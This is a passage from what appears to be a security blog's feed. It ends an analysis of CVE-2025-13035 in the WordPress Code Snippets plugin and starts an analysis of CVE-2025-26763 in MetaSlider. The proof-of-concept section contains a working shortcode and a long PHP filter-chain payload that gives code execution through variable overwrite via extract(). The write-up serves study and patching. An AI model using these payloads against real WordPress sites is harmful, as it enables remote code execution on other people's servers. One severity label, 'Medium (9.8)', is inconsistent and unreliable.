src=&#39;http://localhost:1313/posts/2025-11-27-cve-2025-13035/file.png&#39; alt=&#34;File&#34; height=&#34;253&#34; width=&#34;561&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;flat-files-enabled.flag created&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Once the file exists, the function determines the snippet&amp;rsquo;s network information, retrieves the hashed table name, and builds the path to the snippet content file assigned to &lt;code&gt;$filepath&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;If &lt;code&gt;$filepath&lt;/code&gt; exists, the function calls &lt;code&gt;evaluate_shortcode_from_flat_file( $filepath, $atts )&lt;/code&gt; where the vulnerability occurs.&lt;/p&gt;&#xA;&lt;div class=&#34;details admonition info open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-circle-info&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Info&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;The vulnerability is published with Contributor privileges because this is the minimum level required to insert a shortcode into a post.&lt;/p&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;graph TD&#xA;&#xA;A[&amp;#34;Contributor inserts [code_snippet] shortcode&amp;#34;] --&amp;gt; B[&amp;#34;WordPress calls render_content_shortcode()&amp;#34;]&#xA;B --&amp;gt; C[&amp;#34;convert_boolean_attribute_flags()&amp;#34;]&#xA;C --&amp;gt; D[&amp;#34;shortcode_atts(): merge defaults into $atts&amp;#34;]&#xA;D --&amp;gt; E[&amp;#34;Determine snippet_id → if invalid → invalid_id_warning()&amp;#34;]&#xA;&#xA;E --&amp;gt; F[&amp;#34;get_snippet(id, network, &amp;#39;html&amp;#39;) → create Snippet object&amp;#34;]&#xA;F --&amp;gt; G{&amp;#34;snippet.scope == &amp;#39;content&amp;#39;?&amp;#34;}&#xA;&#xA;G -- No --&amp;gt; H[&amp;#34;render_snippet_source()&amp;#34;]&#xA;H --&amp;gt; Z[&amp;#34;End&amp;#34;]&#xA;&#xA;G -- Yes --&amp;gt; I[&amp;#34;evaluate_shortcode_content(snippet, original_atts)&amp;#34;]&#xA;&#xA;I --&amp;gt; J{&amp;#34;original_atts[&amp;#39;php&amp;#39;] enabled?&amp;#34;}&#xA;J -- No --&amp;gt; K[&amp;#34;Return snippet-&amp;gt;code&amp;#34;] --&amp;gt; Z&#xA;&#xA;J -- Yes --&amp;gt; L{&amp;#34;Snippet_Files::is_active()?&amp;#34;}&#xA;&#xA;L -- No --&amp;gt; M[&amp;#34;evaluate_shortcode_from_db()&amp;#34;] --&amp;gt; Z&#xA;&#xA;L -- Yes --&amp;gt; N[&amp;#34;Build file path: build_snippet_flat_file_path()&amp;#34;]&#xA;N --&amp;gt; O{&amp;#34;Does file exist?&amp;#34;}&#xA;&#xA;O -- No --&amp;gt; M&#xA;&#xA;O -- Yes --&amp;gt; P[&amp;#34;evaluate_shortcode_from_flat_file(filepath, atts)&amp;#34;]&#xA;&#xA;P --&amp;gt; Q[&amp;#34;extract(atts) inside IIFE&amp;#34;]&#xA;Q --&amp;gt; R{&amp;#34;Do atts contain variable-name collisions (e.g., &amp;#39;filepath&amp;#39;)?&amp;#34;}&#xA;&#xA;R -- No --&amp;gt; S[&amp;#34;require_once filepath (safe)&amp;#34;] --&amp;gt; Z&#xA;&#xA;R -- Yes --&amp;gt; T[&amp;#34;Internal variable overwritten → filepath replaced&amp;#34;]&#xA;T --&amp;gt; U[&amp;#34;require_once attacker-controlled file&amp;#34;]&#xA;U --&amp;gt; V[&amp;#34;RCE achieved&amp;#34;]&#xA;V --&amp;gt; Z&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Administrator enables the &amp;ldquo;Enable file-based execution&amp;rdquo; option.&lt;/li&gt;&#xA;&lt;li&gt;Contributor inserts the following shortcode into a post with &lt;code&gt;snippet_id&lt;/code&gt; pointing to a Snippet of type HTML (&lt;code&gt;content&lt;/code&gt;):&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;[code_snippet snippet_id=4 php=1 filepath=/path/to/file]&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Here the attacker has full control over the &lt;code&gt;filepath&lt;/code&gt; variable. This allows using PHP stream wrappers (e.g., filter chains) to achieve code execution because:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;require_once&lt;/code&gt; only checks whether the input is a valid PHP path; it attempts to load &lt;strong&gt;any&lt;/strong&gt; provided stream, not limited to physical files.&lt;/li&gt;&#xA;&lt;li&gt;PHP filter chains can transform the stream content so PHP interprets the final output as valid PHP code. Once the filtered content is passed to &lt;code&gt;require_once&lt;/code&gt;, PHP executes it.&lt;/li&gt;&#xA;&lt;li&gt;Many wrappers such as &lt;code&gt;http://&lt;/code&gt; or &lt;code&gt;ftp://&lt;/code&gt; are restricted by default &lt;code&gt;allow_url_include&lt;/code&gt; settings, but internal wrappers like &lt;code&gt;php://filter&lt;/code&gt; are unaffected by this limitation.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;div class=&#34;details admonition info open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-circle-info&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Info&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;A &lt;strong&gt;filter chain&lt;/strong&gt; in PHP allows chaining multiple stream filters to process data when reading or writing from a file/stream. It works using the special wrapper: &lt;code&gt;php://filter&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;This technique is used in CTF competitions, based on the following principles:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;code&gt;php://filter&lt;/code&gt;: allows attaching filters to a stream (here &lt;code&gt;php://temp&lt;/code&gt;).&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Filter chain: filters are concatenated with &lt;code&gt;|&lt;/code&gt;. Data passes through each filter from left to right.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Main filters in the chain:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;convert.iconv.&amp;lt;from&amp;gt;&lt;/code&gt;.&lt;code&gt;&amp;lt;to&amp;gt;&lt;/code&gt;: converts encoding from one charset to another.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;convert.base64-encode&lt;/code&gt; / &lt;code&gt;convert.base64-decode&lt;/code&gt;: encode or decode base64.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;By combining dozens of filters, data is transformed multiple times: encode → re-encode → decode → encode → … until the end.&#xA;Reference: &lt;a href=&#34;https://www.synacktiv.com/publications/php-filters-chain-what-is-it-and-how-to-use-it&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;https://www.synacktiv.com/publications/php-filters-chain-what-is-it-and-how-to-use-it&lt;/a&gt;&lt;/p&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;p&gt;Run the &lt;a href=&#34;https://github.com/synacktiv/php_filter_chain_generator/tree/main&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;script&lt;/a&gt; to generate a PHP Filter Chain:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$ python3 php_filter_chain_generator.py --chain &amp;#39;&amp;lt;?php phpinfo(); ?&amp;gt;  &amp;#39;&#xA;[&amp;#43;] The following gadget chain will generate the following code : &amp;lt;?php phpinfo(); ?&amp;gt;   (base64 value: PD9waHAgcGhwaW5mbygpOyA/PiAg)&#xA;php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Assign the generated value to &lt;code&gt;filepath&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-27-cve-2025-13035/result.png&#34; title=&#34;Result&#34; data-thumbnail=&#34;/posts/2025-11-27-cve-2025-13035/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;Result&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-27-cve-2025-13035/result.png&#39; alt=&#34;Result&#34; height=&#34;862&#34; width=&#34;1494&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Result&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The vulnerability in the Code Snippets plugin originates from using &lt;code&gt;extract()&lt;/code&gt; without protection, allowing internal variables to be overwritten and arbitrary file execution via &lt;code&gt;require_once&lt;/code&gt;. When combined with the “Enable file-based execution” option and the &lt;code&gt;[code_snippet]&lt;/code&gt; shortcode, a Contributor-level user can trigger unintended PHP code execution. The patch mitigates this by using &lt;code&gt;EXTR_SKIP&lt;/code&gt;, ensuring sensitive variables are not overwritten during shortcode processing.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Using &lt;code&gt;extract()&lt;/code&gt; without controlling variable names is highly risky, especially when input comes from users.&lt;/li&gt;&#xA;&lt;li&gt;PHP stream wrappers, including filter chains, can be powerful tools for converting data into executable code.&lt;/li&gt;&#xA;&lt;li&gt;A seemingly harmless option like “Enable file-based execution” can significantly expand the attack surface.&lt;/li&gt;&#xA;&lt;li&gt;WordPress shortcodes must be carefully handled since Contributors can use them in post content.&lt;/li&gt;&#xA;&lt;li&gt;Adding &lt;code&gt;EXTR_SKIP&lt;/code&gt; in the patch is a simple but effective measure to prevent overwriting sensitive variables.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/deserialization/index.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Deserialization&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/code-snippets/vulnerability/wordpress-code-snippets-plugin-3-9-1-authenticated-contributor-php-code-injection-via-extract-and-php-filter-chains-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Code Snippets Plugin &amp;lt;= 3.9.1 is vulnerable to PHP Object Injection&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-26763 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2025-11-26-cve-2025-26763/</link>
      <pubDate>Wed, 26 Nov 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-11-26-cve-2025-26763/</guid>
      <category domain="http://localhost:1313/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-11-26-cve-2025-26763/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Deserialization of Untrusted Data vulnerability in MetaSlider Responsive Slider by MetaSlider allows Object Injection. This issue affects Responsive Slider by MetaSlider: from n/a through 3.94.0.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-26763&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-26763&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: PHP Object Injection&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 3.94.0&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 3.95.0&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Medium (9.8)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Editor&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/ml-slider/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Responsive Slider by MetaSlider Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;Responsive Slider by MetaSlider&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;3.94.0&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;3.95.0&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; or any diff tool.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; 